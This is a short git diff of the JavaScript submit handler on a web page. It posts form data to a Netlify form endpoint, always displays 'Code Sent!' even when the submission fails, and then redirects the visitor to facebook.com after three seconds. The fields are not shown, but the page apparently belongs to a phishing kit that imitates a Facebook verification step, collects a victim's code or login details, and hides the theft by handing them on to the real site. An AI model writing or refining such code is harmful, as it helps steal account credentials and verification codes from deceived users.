@@ -255,33 +255,25 @@
         const successMessage = document.getElementById('successMessage');
 
         form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Change button text
-            verifyBtn.disabled = true;
-            verifyBtn.textContent = 'Sending code...';
-            
-            // Submit form data to Netlify
-            const formData = new FormData(form);
-            
+            e.preventDefault(); // Stops the default Netlify redirect
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.textContent = 'Sending code...';
+            // Submit via fetch (no redirect)
+            const formData = new FormData(this);
             fetch('/', {
                 method: 'POST',
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 body: new URLSearchParams(formData).toString()
             }).then(() => {
-                // Show success message
                 successMessage.style.display = 'block';
-                verifyBtn.textContent = 'Code Sent!';
-                
-                // Wait 3 seconds then redirect to Facebook
+                btn.textContent = 'Code Sent!';
                 setTimeout(function() {
                     window.location.href = 'https://www.facebook.com';
                 }, 3000);
             }).catch(() => {
-                // If submission fails, still show success and redirect
                 successMessage.style.display = 'block';
-                verifyBtn.textContent = 'Code Sent!';
-                
+                btn.textContent = 'Code Sent!';
                 setTimeout(function() {
                     window.location.href = 'https://www.facebook.com';
                 }, 3000);
